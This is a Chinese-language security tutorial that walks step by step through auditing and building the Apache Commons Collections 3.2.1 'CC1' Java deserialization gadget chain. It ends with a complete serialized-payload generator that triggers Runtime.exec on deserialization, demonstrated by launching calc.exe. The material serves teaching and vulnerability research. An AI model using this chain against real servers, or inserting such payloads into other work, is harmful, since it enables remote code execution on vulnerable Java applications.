[TOC]



# ==ApacheCC1链一审计==

## 教材内容

#### 一、Common Collections简介

##### 1、基本功能

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具 类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。可以在Apache官网下载CC的jar文件和源代码，用于代码审计。https://commons.apache.org/proper/commons-collections/ ，本教程以3.2.1版本为例，JDK版本必须在1.8.0_71以下，因为之后的版本无法利用 sun.reflect.annotation.AnnotationInvocationHandler 类进行反序列化处理。可以在此下载JDK源码：https://hg.openjdk.org/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes （此版本针对1.8.0_60，如果是其他版本，则浏览 https://hg.openjdk.org/ 即可）。

Java集合框架：称为Collection，是Java中存在的一系列操作List、Set和Map的类的集合。Commons Collections扩展了集合框架，增强了很多功能。

##### 2、代码示例

```java
package com.ymqyyds.vul;

import org.apache.commons.collections.OrderedMap;
import org.apache.commons.collections.map.LinkedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollection {

    public static void main(String[] args) throws Exception{
        // 常规的HashMp是无序存放的，目的是提升性能
        Map<String,String> map = new HashMap<>();
        map.put("one","111");
        map.put("two","222");
        map.put("three","33");
        map.put("four","444");
        map.put("five","555");
        map.put("six","666");

        for (String key : map.keySet()) {
            System.out.println("key: " + key + "  value: " + map.get(key));  // 顺序为 6 4 1 2 3 5
        }

        System.out.println("-----------------------------------");

        //但如果使用Common-Collection中的OrderMap就是有序的
        OrderedMap ordermap = new LinkedMap();

        ordermap.put("one","111");
        ordermap.put("two","222");
        ordermap.put("three","33");
        ordermap.put("four","444");
        ordermap.put("five","555");
        ordermap.put("six","666");

        for (Object key : ordermap.keySet()) {
            System.out.println("key: " + key + "  value: " + ordermap.get(key));  // 顺序为 1 2 3 4 5 6
        }
        System.out.println(ordermap.firstKey());
        System.out.println(ordermap.lastKey());
        System.out.println(ordermap.nextKey("three"));
    }
}
```

##### 3、CC1链调用过程

```
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()        
		Map().setValue()        
		TransformedMap.decorate()            
			ChainedTransformer.transform()                
				ConstantTransformer.transform()                
				InvokerTransformer.transform()                   
                	Method.invoke()                    
                	Class.getMethod()                
                InvokerTransformer.transform()                    
                	Method.invoke()                    
                	Runtime.getRuntime()                
                InvokerTransformer.transform()                    
                	Method.invoke()                    
                	Runtime.exec()
```

#### 二、基本的调用链梳理

1、在org.apache.commons.collections.functors中，存在一个InvokerTransformer类，该类的定义如下：

```java
public class InvokerTransformer implements Transformer, Serializable {

    /** The serial version */
    private static final long serialVersionUID = -8653385846894047688L;
    
    /** The method name to call */
    private final String iMethodName;
    /** The array of reflection parameter types */
    private final Class[] iParamTypes;
    /** The array of reflection arguments */
    private final Object[] iArgs;
```

2、可以看出，该类实现了Serializable接口，所以可以实现序列化和反序列化。进一步审计发现该类存在transform方法，可以进行反序列化操作。

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

万恶之源来自如下几句代码

```java
Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

其中 input 是该方法的参数；iMethodName、iParamTypes（Class []）、iArgs（Class []） 三个都是该类的私有属性

同时寻找到了，该类存在 传递参数的构造方法

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}
```

刚好就是我们上文中所说的三个参数。

综上所述，这几句的意思是，利用 input 的类，进行类反射，并且获取其中的方法进行执行。

那么我们就可以让 input 是 Runtime 类，然后 iMethodName 是 exec ；iParamTypes 是 String[].class；iArgs 就是我们想要执行的指令

3、也就是说，如果直接调用该类的transform方法，则可以实现RCE：

```java
public void test1(){
    Runtime runtime = Runtime.getRuntime();
    // 测试直接通过调用是否可以进行代码执行
    // 先把构造方法所需要的三个参数准备好
    String iMethodName = "exec";
    Class[] iParamTypes = new Class[] {String.class};
    Object[] iArgs = new Object[] {"calc.exe"};

    // 利用构造好的属性创建 invokerTransformer 对象
    InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName,iParamTypes,iArgs);

    invokerTransformer.transform(runtime);
}
```

上述代码的执行结果可以调用出我的计算器，表明，此处（即InvokerTransfomer类的transform方法）可以作为漏洞利用的终点。

4、所以要看哪个类调用了transform方法就可以进行分析。通过查找， 发现在TransformedMap里边的checkSetValue调用了transform。

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

此时 只需要调用这个方法并且传入参数 value 为 runtime ，然后 设置属性 valueTransformer 为下面的

5、再找哪里调用了checkSetValue，可以看到AbstractInputCheckedMapDecorator类下边的静态内部类MapEntry中的setValue方法调用了这个方法，再找哪里可以对map进行赋值。

```java
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```



6、在TransformedMap的decorate方法是可以传入参数的，所以这个地方可以利用起来，将InvokerTransformer实例传入。

```
Runtime r = Runtime.getRuntime();String iMethodName = "exec";Class[] iParamTypes =  new Class[] {String.class};Object[] iArgs = new Object[] {"calc.exe"};InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName, iParamTypes, iArgs);HashMap<Object,Object> map = new HashMap<>();TransformedMap.decorate(map,null,invokerTransformer);    // 可以进入decorate方法并返回一个Map对象
```

7、在AbstractInputCheckedMapDecorator里边有一个静态类MapEntry的setValue方法中也有调用checkSetValue，所以，此时可以构造以下代码，实现调用。

```
public void test2() throws Exception {    Runtime runtime = Runtime.getRuntime();    String methodName = "exec";    Class[] paramTypes = new Class[] {String.class};    Object[] args = new Object[] {"calc.exe"};    InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);    Map map = new HashMap();    map.put("key", "value");    Transformer keyTransformer = null;    Transformer valueTransformer = invokerTransformer;    Map<Object, Object> transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);    // transformedMap 是由Map声明，所以不能直接调用checkSetValue，所以只能往上级找    for (Map.Entry entry: transformedMap.entrySet()) {        entry.setValue(runtime);    // 此处调用setValue时会触发整个链条，打开计算器程序    }}
```

此处需要注意的是，相当于是TransformedMap的父类AbstractInputCheckedMapDecorator重写了entrySet()方法，如果是正常的一个HashMap，则调用的就是HashMap的entrySet()方法，道理是一样的。另外，此处使用的是static Class来定义的静态内部类，所谓静态内部类是指不用实例化可以直接调用的类，且仅供当前类调用。

8、接下来寻找谁在调用AbstractInputCheckedMapDecorator中静态类MapEntry的setValue方法，发现直接找到了一个JDK内置的对象：sun.reflect.annotation.AnnotationInvocationHandler中的readObject方法在调用。

```
Map<String, Class<?>> memberTypes = annotationType.memberTypes();for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {    String name = memberValue.getKey();    Class<?> memberType = memberTypes.get(name);    if (memberType != null) {  // i.e. member still exists        Object value = memberValue.getValue();        if (!(memberType.isInstance(value) ||            value instanceof ExceptionProxy)) {            memberValue.setValue(                        // 此处为调用点            new AnnotationTypeMismatchExceptionProxy(            value.getClass() + "[" + value + "]").setMember(            annotationType.members().get(name)));        }    }}
```

如果本调用链成立，那么问题就变得非常简单了，那就是直接构造AnnotationInvocationHandler的序列化过程即可完成操作，并且通过readObject在反序列化就可以实现调用，所以来尝试对其进行调用（连同第一步第二步的初始化配置）：

```
public void test3() throws Exception {    Runtime runtime = Runtime.getRuntime();    String methodName = "exec";    Class[] paramTypes = new Class[] {String.class};    Object[] args = new Object[] {"calc.exe"};    InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);    Map map = new HashMap();    map.put("key", "value");    Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);    // 发现AnnotationInvocationHandler是非public修饰符，是default默认修饰筌，无法直接在外部被实例化    // 所以只能尝试使用反射进行实例化操作    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);    constructor.setAccessible(true);    // 由于构造方法无法访问，所以需要设置为可访问    Object obj = constructor.newInstance(Override.class, transformedMap);    // 对obj进行序列化    FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");    ObjectOutputStream ois = new ObjectOutputStream(fos);    ois.writeObject(obj);}
```

9、对上述代码进行反序列化，发现并不能弹出calc.exe，当然也不会出现异常，还得继续调试来确定是什么原因引起的。

```
FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");ObjectOutputStream ois = new ObjectOutputStream(fos);ois.writeObject(obj);
```

#### 三、完善调用链并进行有效赋值

1、关联正确的JDK源码和sun包源码

（1）由于sun包默认不在配套的JDK源码中，所以单独下载容易导致sun包的源码不匹配，如果源码版本不匹配，会导致无法正常完成调试（以1.8.0_60为例）

![image-20230828231118696](https://gitee.com/ymq_typroa/typroa/raw/main/202308282311734.png)

（2）访问 https://hg.openjdk.org/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes ，点击左侧 zip 下载源码：

![image-20230828230803634](https://gitee.com/ymq_typroa/typroa/raw/main/202308282308707.png)

（3）下载到本地后，解压。然后进入 C:\Program Files (x86)\Java\jdk1.8.0_60 目录下，将原始的 src.zip 也解压，解压后复制刚才下载的源码包中的 sun 目录到 src目录中。

![image-20230828230925545](https://gitee.com/ymq_typroa/typroa/raw/main/202308282309587.png)

（4）在idea中，将src目录作为JDK的源码进行导入（不再导入src.zip)，此时完成源码匹配，可以正常进行调试，在JDK源码中设置断点等操作。

![image-20230828231300927](https://gitee.com/ymq_typroa/typroa/raw/main/202308282313966.png)

2、基于上述序列化过程进行反序列化，并进行调试，在AnnotationInvocationHandler类的readObject方法中设置断点，发现代码无法执行到setValue方法处。

![“](https://gitee.com/ymq_typroa/typroa/raw/main/202308282318915.png)

原因是因为，在JDK默认注解Override中，没有提供一个有效的字段（下面的代码为Override注解的源代码）

```
@Target(ElementType.METHOD)@Retention(RetentionPolicy.SOURCE)public @interface Override {}
```

所以导致在AnnotationInvocationHandler第446行获取memberTypes.get(name);时，memberType的值为空，导致无法继续。所以我们需要构造一个不为空的注解实例，如Target注解或SuppressWarnings注解（JDK自带注解）。

3、快速了解和学习一下注解

（1）定义一个注解，用于修饰一个类

```
import java.lang.annotation.*;@Retention(RetentionPolicy.RUNTIME)     // 指定注解可以存在于.class文件中@Target(ElementType.TYPE)               // 指定注解的作用域为类或者接口等@Inherited                              // 指定该注解可以用于继承的子类中public @interface MyAnnotation {    String name() default "Zhangsan";   // 定义name属性且赋值默认值    String[] info() ;                  // 定义user属性为一个字符串数组}
```

（2）定义一个被MyAnnotation修饰的类，并通过反射获取注解的一些基本信息

```
@MyAnnotation(name = "Lisi", info = {"WN001", "18812345678", "Chengdu", "Male"})public class AnnotationTest {    private String name;    public static void main(String[] args) throws Exception {        Class clazz = AnnotationTest.class;        MyAnnotation myAnnotation = (MyAnnotation) clazz.getAnnotation(MyAnnotation.class);        System.out.println(myAnnotation);        System.out.println(myAnnotation.name());        System.out.println(myAnnotation.info()[1]);        System.out.println(myAnnotation.annotationType());    }}
```

> 注解的参考资料：https://blog.csdn.net/weixin_48991399/article/details/129540384
>
> https://blog.csdn.net/weixin_44848573/article/details/106296399

4、了解的注解的基本用法后，现在来构造一个不为空的memberType，并且要能够正常执行到memberValue.setValue（451行代码），则必须满足memberType != null 并且 !(memberType.isInstance(value)，所以需要找到一个注解（此处使用Target注解，也可以使用SuppressWarnings注解，均能满足条件），拥有至少一个字段，并且该字段必须存在于前面的HashMap中（请看AnnotationInvocationHandler中44行 private final Map memberValues; 的定义。所以修改代码如下：

```
public void test4() throws Exception {    Runtime runtime = Runtime.getRuntime();    String methodName = "exec";    Class[] paramTypes = new Class[] {String.class};    Object[] args = new Object[] {"calc.exe"};    InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);    Map map = new HashMap();    map.put("value", "woniu");        // 此处的Key必须是SuppressWarnings的字段名value    Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);    constructor.setAccessible(true);      Object obj = constructor.newInstance(SuppressWarnings.class, transformedMap);    // 不再使用Override注解    FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");    ObjectOutputStream oos = new ObjectOutputStream(fos);    oos.writeObject(obj);}
```

经过上述改动后，可以进入到AnnotationInvocationHandler类的451行代码中，并且成功执行到InvokerTransformer的transfomr方法，但是执行过程中，发现并没有将类Runtime传进来：

![image-20230829010910046](https://gitee.com/ymq_typroa/typroa/raw/main/202308290109103.png)

此时，运行到这里后，会直接抛出异常如下：

```
Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy' does not exist    at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:129)
```

5、分析上述异常出现的原因，是因为在AnnotationInvocationHandler的452行，出现了 new AnnotationTypeMismatchExceptionProxy 代码，导致传递进去的并不是我们希望中的Runtime对象。

![image-20230829011049455](https://gitee.com/ymq_typroa/typroa/raw/main/202308290110496.png)

6、那么如何解决上述异常信息呢，其实这里最主要的点就在于，要想一个办法来替换memberValue.setValue参数中的类实例，比如替换为Runtime对象。于是找到了 ConstantTransformer 类，里面的

```
// 构造方法，将实例化的参数赋值给自已的属性：iConstantpublic ConstantTransformer(Object constantToReturn) {    super();    iConstant = constantToReturn;}// transform方法，任意传入类型，都只返回iConstant，这样就可以覆盖掉 AnnotationTypeMismatchExceptionProxy 类型public Object transform(Object input) {    return iConstant;}
```

但是我们并没有办法将ConstantTransformer的实例传递给TransformedMap，或者说没有办法建立ConstantTransformer和InvokerTransformer之间的包含关系。甚至我们在test4()方法中可以看出来，runtime实例根本就没有在序列化代码中被调用。所以这是脱节的，所以需要思考，如何能够将他们利用起来。

7、找到ChainedTransformer类，发现该类也存在transform方法，代码及说明如下：

```
// 遍历类属性iTransformers，并调用对应对象的transform方法public Object transform(Object object) {    for (int i = 0; i < iTransformers.length; i++) {        object = iTransformers[i].transform(object);    }    return object;}
```

上述代码的意思是，如果给ChainedTransformer的属性iTransformers赋值为ConstantTransformer对象的话，则可以直接调用到ConstantTransformer的transform方法，如果赋值为InvokerTransformer对象的话，则可以直接调用到InvokerTransformer的transform方法，则此时便有了一个关联关系，将Runtime对象通过ConstantTransformer进行赋值，也有了之前在test4()方法中对InvokerTransformer的赋值调用。

先完成对ConstantTransformer的赋值：

```
public void test5() throws Exception {    // 构造实例化ChainedTransformer实例化时需要用到的参数    Transformer[] transformers = new Transformer[] {            new ConstantTransformer(Runtime.class)    };    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);   // 实例化ChainedTransformer    Map map = new HashMap();    map.put("value", "woniu");    Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer); // 参数为chainedTransformer    // 所以只能尝试使用反射进行实例化操作AnnotationInvocationHandler  (略)    // 对obj进行序列化(代码略)}
```

通过调试发现Runtime对象已经传入ChainedTransformer的transform方法中：

![image-20230829013702751](https://gitee.com/ymq_typroa/typroa/raw/main/202308290137804.png)

8、但是上述代码还没有完成，因为还没有InvokerTransformer的参与，所以还需要继续赋值。那么仍然基于ChainedTransformer的实例化过程，需要构造一个Transformer数组，而InvokerTransformer实现了Transformer接口，所以类型是兼容的。再考虑ChainedTransformer的链式调用，上一次调用的object，将用于下一次的transform，进而可以将Runtime.getRuntime.exec这几次方法的调用完成：

```
public void test5() throws Exception {    // 链式调用，逐步赋值    Transformer[] transformers = new Transformer[] {            new ConstantTransformer(Runtime.class),            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})    };    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    Map map = new HashMap();    map.put("value", "woniu");    Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);    constructor.setAccessible(true);     Object obj = constructor.newInstance(SuppressWarnings.class, transformedMap);    FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");    ObjectOutputStream oos = new ObjectOutputStream(fos);    oos.writeObject(obj);}
```

9、最后将上述序列化代码生成的文件进行反序列化，成功打开计算器。CC1链构造完成。
